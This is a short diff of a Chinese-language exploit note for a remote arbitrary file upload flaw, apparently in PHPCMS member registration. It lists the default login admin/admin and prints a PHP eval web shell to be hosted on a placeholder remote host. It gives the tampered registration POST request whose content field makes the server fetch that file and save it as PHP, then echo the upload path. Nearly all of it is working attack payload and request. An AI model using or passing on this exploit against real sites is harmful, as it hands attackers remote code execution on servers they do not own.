@@ -24,8 +24,12 @@ admin/admin
 存在远程任意文件上传
 ```
 http://xx.xx.xx.xx/1.txt存放内容如下:
-<?php @eval($_POST[zf]);?>
-
+<?php @eval($_POST[1]);?>
+```
+注册抓包改包
+```
+POST /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1
 
 siteid=1&modelid=11&username=test452&password=test2123&email=test2154@163.com&info[content]=<img src=http://xx.xx.xx.xx/1.txt?.php#.jpg>&dosubmit=1&protocol=
 ```
+此时会回显上传的路径
